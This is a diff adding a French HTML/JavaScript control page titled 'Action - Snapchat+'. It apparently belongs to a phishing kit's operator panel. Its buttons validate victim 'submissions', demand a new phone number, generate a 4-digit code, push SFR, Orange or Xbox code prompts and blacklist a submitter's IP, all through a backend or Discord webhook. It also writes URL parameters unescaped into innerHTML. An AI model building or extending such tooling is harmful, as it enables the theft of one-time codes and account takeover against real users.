@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Action - Snapchat+</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', sans-serif;
+            padding: 20px;
+        }
+        .card {
+            background: #111;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 28px;
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+        }
+        .icon { font-size: 64px; margin-bottom: 16px; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #FFBF00;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { color: #fff; font-size: 24px; margin-bottom: 8px; }
+        p { color: rgba(255,255,255,0.4); font-size: 14px; line-height: 1.6; }
+        .btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 14px 28px;
+            background: #FFBF00;
+            color: #000;
+            border: none;
+            border-radius: 14px;
+            text-decoration: none;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+        }
+        .btn:hover { background: #f0b400; }
+        .btn-danger { background: #dc3545; color: #fff; }
+        .btn-danger:hover { background: #c82333; }
+        .code {
+            background: rgba(255,255,255,0.06);
+            padding: 12px;
+            border-radius: 12px;
+            color: #FFBF00;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 4px;
+            margin: 16px 0;
+        }
+        .log {
+            background: rgba(255,255,255,0.03);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+            font-family: monospace;
+            margin-top: 12px;
+            text-align: left;
+            max-height: 100px;
+            overflow-y: auto;
+            word-break: break-all;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card" id="main-card">
+        <div id="content">
+            <!-- Contenu généré par JS -->
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 📡 CONFIGURATION
+        // ============================================================
+        const API_URL = window.location.origin + '/api'; // ← Ton backend Flask
+        // OU webhook direct :
+        // const WEBHOOK_ACTION = 'https://discord.com/api/webhooks/...';
+
+        // ============================================================
+        // LIRE LES PARAMÈTRES DE L'URL
+        // ============================================================
+        const params = new URLSearchParams(window.location.search);
+        const action = params.get('action');
+        const id = params.get('id');
+
+        const card = document.getElementById('content');
+
+        // ============================================================
+        // AFFICHER UN MESSAGE
+        // ============================================================
+        function showMessage(icon, title, message, extra = '', btnText = 'Fermer', btnAction = null) {
+            card.innerHTML = `
+                <div class="icon">${icon}</div>
+                <h1>${title}</h1>
+                <p>${message}</p>
+                ${extra}
+                <button class="btn" id="action-btn">${btnText}</button>
+            `;
+            const btn = document.getElementById('action-btn');
+            if (btnAction) {
+                btn.onclick = btnAction;
+            } else {
+                btn.onclick = () => window.close();
+            }
+        }
+
+        // ============================================================
+        // AFFICHER UNE PAGE DE CHARGEMENT
+        // ============================================================
+        function showLoading(title = 'Exécution en cours...') {
+            card.innerHTML = `
+                <div class="icon">⏳</div>
+                <h1>${title}</h1>
+                <div class="spinner"></div>
+                <p style="font-size:12px;color:rgba(255,255,255,0.2)">Veuillez patienter...</p>
+            `;
+        }
+
+        // ============================================================
+        // ENVOYER UNE ACTION AU BACKEND
+        // ============================================================
+        async function sendAction(actionType, id, data = {}) {
+            try {
+                const res = await fetch(`${API_URL}/action`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        action: actionType,
+                        submission_id: id,
+                        ...data
+                    })
+                });
+                return await res.json();
+            } catch (e) {
+                console.error('Erreur:', e);
+                return { success: false, error: e.message };
+            }
+        }
+
+        // ============================================================
+        // ACTIONS
+        // ============================================================
+        const actions = {
+
+            // ✅ VALIDER
+            validate: async function(id) {
+                showLoading('Validation en cours...');
+                const result = await sendAction('validate', id);
+                if (result.success) {
+                    showMessage('✅', 'Validation réussie !',
+                        `La soumission #${id} a été validée.`,
+                        `<div class="code">✓ VALIDÉ</div>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible de valider #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // ❌ CHANGER LE NUMÉRO
+            change: async function(id) {
+                showLoading('Changement en cours...');
+                const result = await sendAction('change', id);
+                if (result.success) {
+                    showMessage('🔄', 'Changement demandé',
+                        `Un nouveau numéro va être demandé pour #${id}.`,
+                        `<p style="color:rgba(255,255,255,0.3);font-size:12px">L'utilisateur va recevoir une demande de nouveau numéro.</p>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible de changer #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // 🔁 RENVOYER (4 chiffres)
+            resend: async function(id) {
+                showLoading('Génération du code...');
+                const newCode = String(Math.floor(1000 + Math.random() * 9000));
+                const result = await sendAction('resend', id, { code: newCode });
+                if (result.success) {
+                    showMessage('📨', 'Code renvoyé !',
+                        `Un nouveau code à 4 chiffres a été envoyé pour #${id}.`,
+                        `<div class="code">${newCode}</div>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible de renvoyer #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // 🔢 SFR FORMAT
+            sfr: async function(id) {
+                showLoading('Envoi format SFR...');
+                const result = await sendAction('sfr', id);
+                if (result.success) {
+                    showMessage('🔢', 'Format SFR envoyé',
+                        `Le code formaté pour SFR a été envoyé pour #${id}.`,
+                        `<p style="color:rgba(255,255,255,0.3);font-size:12px">Format: SFR (6 chiffres)</p>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible d'envoyer le format SFR #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // 🔢 ORANGE FORMAT
+            orange: async function(id) {
+                showLoading('Envoi format Orange...');
+                const result = await sendAction('orange', id);
+                if (result.success) {
+                    showMessage('🔢', 'Format Orange envoyé',
+                        `Le code formaté pour Orange a été envoyé pour #${id}.`,
+                        `<p style="color:rgba(255,255,255,0.3);font-size:12px">Format: Orange (6 chiffres)</p>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible d'envoyer le format Orange #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // 🔢 XBOX FORMAT
+            xbox: async function(id) {
+                showLoading('Envoi format Xbox...');
+                const result = await sendAction('xbox', id);
+                if (result.success) {
+                    showMessage('🔢', 'Format Xbox envoyé',
+                        `Le code formaté pour Xbox/Microsoft a été envoyé pour #${id}.`,
+                        `<p style="color:rgba(255,255,255,0.3);font-size:12px">Format: Xbox (6 chiffres)</p>`
+                    );
+                } else {
+                    showMessage('❌', 'Erreur',
+                        `Impossible d'envoyer le format Xbox #${id}: ${result.error || 'erreur inconnue'}`
+                    );
+                }
+            },
+
+            // 🚫 BLACKLIST
+            blacklist: async function(id) {
+                showLoading('Blacklist en cours...');
+                // Récupérer l'IP de la soumission
+                try {
+                    const subRes = await fetch(`${API_URL}/submissions/${id}`);
+                    const subData = await subRes.json();
+                    const ip = subData.ip || 'Inconnue';
+                    
+                    const result = await sendAction('blacklist', id, { ip: ip });
+                    if (result.success) {
+                        showMessage('🚫', 'Blacklist activée',
+                            `L'IP de l'utilisateur #${id} (${ip}) a été blacklistée.`,
+                            `<p style="color:rgba(255,80,80,0.6);font-size:12px">⚠️ Cette action est irréversible.</p>`,
+                            'Fermer'
+                        );
+                    } else {
+                        showMessage('❌', 'Erreur',
+                            `Impossible de blacklister #${id}: ${result.error || 'erreur inconnue'}`
+                        );
+                    }
+                } catch (e) {
+                    showMessage('❌', 'Erreur',
+                        `Impossible de récupérer les infos de #${id}`
+                    );
+                }
+            }
+        };
+
+        // ============================================================
+        // EXÉCUTER L'ACTION
+        // ============================================================
+        async function executeAction() {
+            if (!action || !id) {
+                showMessage('❌', 'Action invalide', 'Aucune action ou ID spécifié.');
+                return;
+            }
+
+            const actionFn = actions[action];
+            if (!actionFn) {
+                showMessage('❓', 'Action inconnue', `L'action "${action}" n'est pas reconnue.`);
+                return;
+            }
+
+            // Exécuter l'action
+            await actionFn(id);
+        }
+
+        // ============================================================
+        // DÉMARRAGE
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', executeAction);
+    </script>
+</body>
+</html>
